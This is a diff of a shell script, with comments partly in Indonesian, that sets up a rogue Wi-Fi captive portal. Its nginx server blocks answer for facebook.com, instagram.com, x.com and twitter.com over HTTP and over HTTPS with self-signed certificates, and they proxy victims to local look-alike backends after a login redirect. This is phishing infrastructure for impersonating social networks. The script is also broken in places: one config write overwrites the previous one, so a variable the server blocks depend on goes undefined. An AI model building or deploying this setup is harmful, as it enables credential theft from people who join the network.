@@ -137,26 +137,127 @@ iptables -A FORWARD -i "$AP_IFACE" -p udp --dport 853 -j REJECT
 
 echo "[*] Captive portal iptables rules applied!"
 
-cat > /etc/nginx/sites-available/default <<EOF
-# Portal utama
+sudo tee /etc/nginx/sites-available/default > /dev/null <<'NGINX'
+user www-data;
+worker_processes auto;
+pid /run/nginx.pid;
+include /etc/nginx/modules-enabled/*.conf;
+
+events {
+    worker_connections 768;
+}
+
+http {
+    sendfile on;
+    tcp_nopush on;
+    types_hash_max_size 2048;
+
+    include /etc/nginx/mime.types;
+    default_type application/octet-stream;
+
+    ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3;
+    ssl_prefer_server_ciphers on;
+
+    error_log /var/log/nginx/error.log;
+
+    gzip on;
+
+    server_names_hash_bucket_size 128;
+
+    log_format withhost '$remote_addr - [$time_local] "$request" '
+                        'host:$host status:$status upstream:$upstream_addr '
+                        'rt:$request_time ua:"$http_user_agent"';
+
+    access_log /var/log/nginx/access.log withhost;
+
+    ####################################
+    # captive/login logic (keep here)
+    ####################################
+    # apakah ada cookie logged_in?
+    map $cookie_logged_in $is_logged_in {
+        default 0;
+        1       1;
+    }
+
+    # apakah ada arg captive (returning from portal)
+    map $arg_captive $is_captive {
+        default 0;
+        1       1;
+    }
+
+    # gabungkan keduanya jadi flag need_portal
+    map "$is_logged_in$is_captive" $need_portal {
+        default 1;
+        10      0;
+        01      0;
+        11      0;
+    }
+
+    # include other configs
+    include /etc/nginx/conf.d/*.conf;
+    include /etc/nginx/sites-enabled/*;
+}
+
+NGINX
+
+sudo tee /etc/nginx/sites-available/default > /dev/null <<'NGINX'
+# ===================== PORTAL BY IP =====================
 server {
     listen 80;
     server_name 192.168.15.1 portal.local;
 
     root /var/www/html;
-    index index.html;
+    index index.html index.htm;
 
+    # Portal static app
     location / {
         try_files $uri $uri/ /index.html;
     }
+
+    # Optional: if portal app is Express behind port 3003:
+    location /api/ {
+        proxy_redirect off;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_pass http://127.0.0.1:3003;
+        include /etc/nginx/proxy_params;
+    }
 }
 
-# ===================== FACEBOOK =====================
+# ===================== FACEBOOK -> :3000 =====================
 server {
     listen 80;
-    server_name facebook.com www.facebook.com m.facebook.com;
+    server_name facebook.com www.facebook.com m.facebook.com fb.com;
+
+    access_log /var/log/nginx/facebook_access.log withhost;
+    error_log  /var/log/nginx/facebook_error.log;
+
+    # debug headers (optional: remove in production)
+    add_header X-Debug-Host $host always;
+    add_header X-Debug-Need-Portal $need_portal always;
+    add_header X-Debug-Arg $arg_captive always;
+    add_header X-Debug-Cookie $cookie_logged_in always;
 
     location / {
+        # 1) not authorized -> capture origin and redirect to portal app
+        if ($need_portal = 1) {
+            set $origin "$scheme://$host$request_uri";
+            return 302 http://192.168.15.1:3003/?origin=$origin;
+        }
+
+        # 2) returning from portal -> set cookie for this host domain and continue
+        if ($arg_captive = 1) {
+            add_header Set-Cookie "logged_in=1; Path=/; Max-Age=3600; HttpOnly" always;
+            # Do not return here; let proxy_pass handle response from backend
+        }
+
+        # proxy headers and pass to backend app on port 3000
+        proxy_redirect off;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+
         proxy_pass http://127.0.0.1:3000;
         include /etc/nginx/proxy_params;
     }
@@ -164,24 +265,60 @@ server {
 
 server {
     listen 443 ssl;
-    server_name facebook.com www.facebook.com m.facebook.com;
-
+    server_name facebook.com www.facebook.com m.facebook.com fb.com;
 
     ssl_certificate     /etc/ssl/certs/ssl-cert-snakeoil.pem;
-        ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
+    ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
+
+    access_log /var/log/nginx/facebook_access.log withhost;
+    error_log  /var/log/nginx/facebook_error_ssl.log;
 
     location / {
+        if ($need_portal = 1) {
+            set $origin "$scheme://$host$request_uri";
+            return 302 http://192.168.15.1:3003/?origin=$origin;
+        }
+
+        if ($arg_captive = 1) {
+            add_header Set-Cookie "logged_in=1; Path=/; Max-Age=3600; HttpOnly" always;
+        }
+
+        proxy_redirect off;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+
         proxy_pass http://127.0.0.1:3000;
         include /etc/nginx/proxy_params;
     }
 }
 
-# ===================== INSTAGRAM =====================
+# ===================== INSTAGRAM -> :3001 =====================
 server {
     listen 80;
     server_name instagram.com www.instagram.com i.instagram.com;
 
+    access_log /var/log/nginx/instagram_access.log withhost;
+    error_log  /var/log/nginx/instagram_error.log;
+
+    add_header X-Debug-Host $host always;
+    add_header X-Debug-Need-Portal $need_portal always;
+
     location / {
+        if ($need_portal = 1) {
+            set $origin "$scheme://$host$request_uri";
+            return 302 http://192.168.15.1:3003/?origin=$origin;
+        }
+
+        if ($arg_captive = 1) {
+            add_header Set-Cookie "logged_in=1; Path=/; Max-Age=3600; HttpOnly" always;
+        }
+
+        proxy_redirect off;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+
         proxy_pass http://127.0.0.1:3001;
         include /etc/nginx/proxy_params;
     }
@@ -191,23 +328,59 @@ server {
     listen 443 ssl;
     server_name instagram.com www.instagram.com i.instagram.com;
 
-
     ssl_certificate     /etc/ssl/certs/ssl-cert-snakeoil.pem;
-        ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
+    ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
+
+    access_log /var/log/nginx/instagram_access.log withhost;
+    error_log  /var/log/nginx/instagram_error_ssl.log;
 
     location / {
+        if ($need_portal = 1) {
+            set $origin "$scheme://$host$request_uri";
+            return 302 http://192.168.15.1:3003/?origin=$origin;
+        }
+
+        if ($arg_captive = 1) {
+            add_header Set-Cookie "logged_in=1; Path=/; Max-Age=3600; HttpOnly" always;
+        }
+
+        proxy_redirect off;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+
         proxy_pass http://127.0.0.1:3001;
         include /etc/nginx/proxy_params;
     }
 }
 
-# ===================== X / TWITTER =====================
+# ===================== X/TWITTER -> :3002 =====================
 server {
     listen 80;
     server_name x.com www.x.com twitter.com www.twitter.com;
 
+    access_log /var/log/nginx/x_access.log withhost;
+    error_log  /var/log/nginx/x_error.log;
+
+    add_header X-Debug-Host $host always;
+    add_header X-Debug-Need-Portal $need_portal always;
+
     location / {
-        proxy_pass http://192.168.15.1:3002;
+        if ($need_portal = 1) {
+            set $origin "$scheme://$host$request_uri";
+            return 302 http://192.168.15.1:3003/?origin=$origin;
+        }
+
+        if ($arg_captive = 1) {
+            add_header Set-Cookie "logged_in=1; Path=/; Max-Age=3600; HttpOnly" always;
+        }
+
+        proxy_redirect off;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+
+        proxy_pass http://127.0.0.1:3002;
         include /etc/nginx/proxy_params;
     }
 }
@@ -216,48 +389,66 @@ server {
     listen 443 ssl;
     server_name x.com www.x.com twitter.com www.twitter.com;
 
-
     ssl_certificate     /etc/ssl/certs/ssl-cert-snakeoil.pem;
-        ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
+    ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
+
+    access_log /var/log/nginx/x_access.log withhost;
+    error_log  /var/log/nginx/x_error_ssl.log;
 
     location / {
-        proxy_pass http://192.168.15.1:3002;
+        if ($need_portal = 1) {
+            set $origin "$scheme://$host$request_uri";
+            return 302 http://192.168.15.1:3003/?origin=$origin;
+        }
+
+        if ($arg_captive = 1) {
+            add_header Set-Cookie "logged_in=1; Path=/; Max-Age=3600; HttpOnly" always;
+        }
+
+        proxy_redirect off;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+
+        proxy_pass http://127.0.0.1:3002;
         include /etc/nginx/proxy_params;
     }
 }
 
-# ===================== CAPTIVE PORTAL DETECTION =====================
-server {
-    listen 80;
-    server_name neverssl.com captive.apple.com www.apple.com
-                connectivitycheck.gstatic.com connectivitycheck.android.com
-                clients3.google.com msftconnecttest.com connectivity-check.ubuntu.com
-                connectivity.samsung.com www.samsung.com www.msftncsi.com
-                detectportal.firefox.com play.googleapis.com gstatic.com;
-
-    location = /gen_204 {
-        add_header Content-Type text/html;
-        return 200 "<html><head><meta http-equiv='refresh' content='0; url=http://192.168.15.1/'></head></html>";
-    }
-    location = /ncsi.txt             { return 200 "Microsoft NCSI"; }
-    location = /hotspot-detect.html  { return 302 http://192.168.15.1/; }
-    location = /success.txt          { return 302 http://192.168.15.1/; }
-    location /                       { return 302 http://192.168.15.1:3003/; }
-}
-
-# ===================== DEFAULT FALLBACK =====================
+# ===================== DEFAULT / CATCH-ALL -> portal =====================
 server {
     listen 80 default_server;
     listen [::]:80 default_server;
     server_name _;
 
+    access_log /var/log/nginx/default_access.log withhost;
+    error_log /var/log/nginx/default_error.log;
+
+    add_header X-Debug-Host $host always;
+    add_header X-Debug-Need-Portal $need_portal always;
+
     location / {
-        proxy_pass http://192.168.15.1:3003;
+        if ($need_portal = 1) {
+            set $origin "$scheme://$host$request_uri";
+            return 302 http://192.168.15.1:3003/?origin=$origin;
+        }
+
+        if ($arg_captive = 1) {
+            add_header Set-Cookie "logged_in=1; Path=/; Max-Age=3600; HttpOnly" always;
+        }
+
+        proxy_redirect off;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+
+        # send to portal app by default if backend not specific
+        proxy_pass http://127.0.0.1:3003;
         include /etc/nginx/proxy_params;
     }
 }
 
-EOF
+NGINX
 
 # ===============================================
 # START SERVICES
